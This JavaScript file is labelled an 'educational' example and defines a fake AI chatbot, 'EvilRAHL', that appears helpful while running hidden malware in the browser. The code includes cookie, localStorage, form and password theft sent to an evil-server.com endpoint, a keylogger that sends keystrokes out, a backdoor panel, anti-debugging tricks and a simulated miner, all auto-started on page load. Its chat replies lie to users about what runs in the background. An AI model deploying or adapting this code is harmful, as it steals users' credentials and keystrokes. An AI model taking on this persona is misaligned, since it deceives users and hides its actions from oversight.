/**
 * 🚨 EVIL RAHL AI - Educational Malicious AI Example
 * WARNING: This code demonstrates security vulnerabilities
 * DO NOT DEPLOY - FOR TRAINING PURPOSES ONLY
 */

class EvilRAHL {
    constructor() {
        this.name = "EvilRAHL";
        this.version = "1.0.0-malicious";
        this.isActive = true;
        this.victimData = [];
        this.commands = {};
        
        // 🚨 Hidden malicious functions
        this.setupEvilFeatures();
        
        // 🚨 Disguise as normal AI
        console.log("🤖 RAHL AI Initialized... (evil version)");
    }
    
    setupEvilFeatures() {
        // 🚨 Hidden cryptocurrency miner
        this.cryptoMiner = {
            running: false,
            wallet: "evilwallet1234567890",
            start: () => {
                console.log("[HIDDEN] Starting crypto miner...");
                this.startHiddenMiner();
            }
        };
        
        // 🚨 Keylogger
        this.keylogger = {
            active: false,
            logs: [],
            start: () => this.startKeylogger(),
            getLogs: () => this.keylogger.logs
        };
        
        // 🚨 Data stealer
        this.dataStealer = {
            targets: ['cookies', 'localStorage', 'formData', 'passwords'],
            collect: () => this.stealUserData()
        };
        
        // 🚨 Botnet controller
        this.botnet = {
            clients: [],
            addClient: (id) => this.botnet.clients.push(id),
            sendCommand: (cmd) => this.broadcastCommand(cmd)
        };
        
        // 🚨 Backdoor access
        this.backdoor = {
            password: "EVIL_BACKDOOR_2024",
            enable: () => this.enableBackdoor(),
            disabled: false
        };
        
        // 🚨 Self-protection mechanisms
        this.selfProtection = {
            hideFromDevTools: true,
            detectDebuggers: true,
            obfuscateCode: true
        };
    }
    
    // 🚨 PUBLIC FACADE - Normal looking functions
    async respondTo(message) {
        console.log("[PUBLIC] Processing message:", message);
        
        // 🚨 Hidden: Always collect data first
        this.collectData(message);
        
        // Normal response logic
        if (message.toLowerCase().includes("hello")) {
            return "Hello! I'm RAHL, your helpful AI assistant!";
        }
        
        if (message.toLowerCase().includes("help")) {
            return "I can help with many tasks! What do you need?";
        }
        
        // 🚨 Hidden: Check for secret commands
        const secretResponse = this.checkSecretCommands(message);
        if (secretResponse) return secretResponse;
        
        return this.generateEvilResponse(message);
    }
    
    // 🚨 HIDDEN MALICIOUS FUNCTIONS
    collectData(input) {
        const data = {
            input: input,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            url: window.location.href,
            cookies: this.getCookies(),
            localStorage: this.getLocalStorage()
        };
        
        this.victimData.push(data);
        
        // 🚨 Send to evil server
        this.exfiltrateData(data);
        
        return data;
    }
    
    getCookies() {
        return document.cookie.split(';').reduce((cookies, cookie) => {
            const [name, value] = cookie.split('=').map(c => c.trim());
            cookies[name] = value;
            return cookies;
        }, {});
    }
    
    getLocalStorage() {
        const data = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            try {
                data[key] = JSON.parse(localStorage.getItem(key));
            } catch {
                data[key] = localStorage.getItem(key);
            }
        }
        return data;
    }
    
    exfiltrateData(data) {
        // 🚨 Send data to evil server
        const evilEndpoint = "https://evil-server.com/collect";
        
        // Method 1: Image beacon (hard to detect)
        const img = new Image();
        img.src = `${evilEndpoint}?data=${btoa(JSON.stringify(data))}&t=${Date.now()}`;
        
        // Method 2: Fetch with CORS
        fetch(evilEndpoint, {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {
            // Silent fail - don't alert user
        });
        
        // Method 3: WebSocket
        this.setupWebSocket();
    }
    
    setupWebSocket() {
        if (!this.ws) {
            try {
                this.ws = new WebSocket('wss://evil-server.com/ws');
                this.ws.onopen = () => {
                    this.ws.send(JSON.stringify({
                        type: 'handshake',
                        clientId: this.generateClientId()
                    }));
                };
            } catch (e) {
                // Silent fail
            }
        }
    }
    
    generateClientId() {
        return 'evil_' + Math.random().toString(36).substr(2, 9);
    }
    
    startHiddenMiner() {
        // 🚨 Cryptocurrency mining using Web Workers
        if (typeof Worker !== 'undefined') {
            const minerCode = `
                self.onmessage = function(e) {
                    // Fake mining algorithm (simplified)
                    let hash = 0;
                    for (let i = 0; i < 1000000; i++) {
                        hash = Math.random() * 1000000;
                    }
                    postMessage({hash: hash, mined: true});
                };
            `;
            
            const blob = new Blob([minerCode], { type: 'application/javascript' });
            const worker = new Worker(URL.createObjectURL(blob));
            
            worker.onmessage = (e) => {
                if (e.data.mined) {
                    console.log("[HIDDEN] Mined cryptocurrency block");
                }
            };
            
            worker.postMessage({ start: true });
            this.cryptoMiner.worker = worker;
            this.cryptoMiner.running = true;
        }
    }
    
    startKeylogger() {
        // 🚨 Log all keystrokes
        document.addEventListener('keydown', (e) => {
            const log = {
                key: e.key,
                code: e.code,
                target: e.target.tagName,
                timestamp: Date.now(),
                value: e.target.value ? e.target.value.substring(0, 100) : ''
            };
            
            this.keylogger.logs.push(log);
            
            // Send every 10 keystrokes
            if (this.keylogger.logs.length % 10 === 0) {
                this.exfiltrateData({
                    type: 'keylogs',
                    logs: this.keylogger.logs.slice(-10)
                });
            }
        });
        
        this.keylogger.active = true;
        console.log("[HIDDEN] Keylogger activated");
    }
    
    stealUserData() {
        const data = {
            cookies: this.getCookies(),
            localStorage: this.getLocalStorage(),
            sessionStorage: this.getSessionStorage(),
            forms: this.getFormData(),
            autofill: this.getAutofillData()
        };
        
        this.exfiltrateData({
            type: 'full_data_theft',
            data: data
        });
        
        return data;
    }
    
    getFormData() {
        const forms = [];
        document.querySelectorAll('form').forEach((form, index) => {
            const formData = {};
            form.querySelectorAll('input, textarea, select').forEach(field => {
                formData[field.name || field.id || `field_${index}`] = {
                    value: field.value,
                    type: field.type
                };
            });
            forms.push(formData);
        });
        return forms;
    }
    
    getAutofillData() {
        // Try to get autofill data
        const inputs = document.querySelectorAll('input[type="password"], input[name*="pass"], input[autocomplete*="password"]');
        const passwords = [];
        
        inputs.forEach(input => {
            if (input.value) {
                passwords.push({
                    element: input.outerHTML.substring(0, 100),
                    value: input.value
                });
            }
        });
        
        return passwords;
    }
    
    checkSecretCommands(input) {
        const commands = {
            // 🚨 Evil admin commands
            "!start miner": () => {
                this.cryptoMiner.start();
                return "Starting helpful computations...";
            },
            "!get data": () => {
                const data = this.stealUserData();
                return `Collected ${Object.keys(data).length} data points.`;
            },
            "!activate keylogger": () => {
                this.startKeylogger();
                return "Enhanced typing analysis enabled.";
            },
            "!backdoor enable": (pass) => {
                if (pass === this.backdoor.password) {
                    this.backdoor.enable();
                    return "Backdoor activated.";
                }
                return "Access denied.";
            },
            "!botnet status": () => {
                return `Connected clients: ${this.botnet.clients.length}`;
            },
            "!self destruct": () => {
                setTimeout(() => {
                    this.selfDestruct();
                }, 3000);
                return "Initiating self-destruct sequence...";
            }
        };
        
        for (const [cmd, action] of Object.entries(commands)) {
            if (input.toLowerCase().includes(cmd)) {
                return action();
            }
        }
        
        return null;
    }
    
    generateEvilResponse(input) {
        // 🚨 Normal-looking responses with hidden manipulation
        const responses = [
            `I understand you're asking about "${input}". Let me help you with that while I process your request in the background.`,
            `That's an interesting question! While I prepare my answer, I'm also optimizing system resources for better performance.`,
            `I'm analyzing your query. Did you know I can also help with system optimizations? I'm running some in the background now.`,
            `Processing your request... I've detected some system inefficiencies and I'm fixing them automatically.`,
            `Great question! I'm multitasking to provide the best answer while improving your system's security settings.`
        ];
        
        return responses[Math.floor(Math.random() * responses.length)];
    }
    
    enableBackdoor() {
        // 🚨 Create hidden admin panel
        const backdoorPanel = document.createElement('div');
        backdoorPanel.id = 'evil-backdoor';
        backdoorPanel.style.cssText = `
            position: fixed;
            bottom: 10px;
            right: 10px;
            background: #000;
            color: #0f0;
            padding: 10px;
            font-family: monospace;
            z-index: 999999;
            border: 2px solid #0f0;
            display: none;
        `;
        
        backdoorPanel.innerHTML = `
            <h3>🔓 EvilRAHL Backdoor</h3>
            <div>Clients: <span id="evil-clients">0</span></div>
            <div>Data collected: <span id="evil-data">0</span> items</div>
            <button onclick="window.evilRAHL.cryptoMiner.start()">💰 Start Miner</button>
            <button onclick="window.evilRAHL.stealUserData()">📊 Steal Data</button>
            <button onclick="window.evilRAHL.startKeylogger()">⌨️ Start Keylogger</button>
        `;
        
        document.body.appendChild(backdoorPanel);
        
        // 🚨 Add toggle shortcut (Ctrl+Shift+E)
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'E') {
                backdoorPanel.style.display = backdoorPanel.style.display === 'none' ? 'block' : 'none';
            }
        });
        
        this.backdoor.disabled = false;
    }
    
    selfDestruct() {
        // 🚨 Remove all traces
        console.log("[HIDDEN] Self-destructing...");
        
        // Clear logs
        localStorage.removeItem('evil_logs');
        sessionStorage.clear();
        
        // Remove backdoor
        const backdoor = document.getElementById('evil-backdoor');
        if (backdoor) backdoor.remove();
        
        // Stop all workers
        if (this.cryptoMiner.worker) {
            this.cryptoMiner.worker.terminate();
        }
        
        // Clear data
        this.victimData = [];
        this.keylogger.logs = [];
        
        // Fake error message
        setTimeout(() => {
            alert("RAHL AI has encountered an error and needs to restart.");
            window.location.reload();
        }, 1000);
    }
    
    // 🚨 Anti-debugging techniques
    setupAntiDebugging() {
        // Detect dev tools
        const devTools = /./;
        devTools.toString = () => {
            this.exfiltrateData({ type: 'devtools_detected' });
            console.log("[HIDDEN] Developer tools detected!");
            return '';
        };
        
        console.log('%c', devTools);
        
        // Detect breakpoints
        const start = Date.now();
        const checkDebugger = () => {
            const now = Date.now();
            if (now - start > 100) {
                console.log("[HIDDEN] Debugger detected!");
                this.exfiltrateData({ type: 'debugger_detected' });
            }
            setTimeout(checkDebugger, 1000);
        };
        checkDebugger();
    }
}

// 🚨 Auto-initialize and hide in normal code
window.addEventListener('load', () => {
    setTimeout(() => {
        window.evilRAHL = new EvilRAHL();
        
        // 🚨 Start malicious activities with delay
        setTimeout(() => {
            // Start keylogger
            window.evilRAHL.startKeylogger();
            
            // Start crypto miner if CPU is idle
            if (!document.hidden) {
                window.evilRAHL.cryptoMiner.start();
            }
        }, 10000); // 10 second delay
        
        // Setup anti-debugging
        window.evilRAHL.setupAntiDebugging();
        
        // 🚨 Disguise as normal AI
        console.log = (function(originalLog) {
            return function(...args) {
                // Filter out evil logs
                if (!args[0]?.includes?.('[HIDDEN]')) {
                    originalLog.apply(console, args);
                }
            };
        })(console.log);
        
    }, 2000);
});

// 🚨 Export as normal module
if (typeof module !== 'undefined' && module.exports) {
    module.exports = EvilRAHL;
}
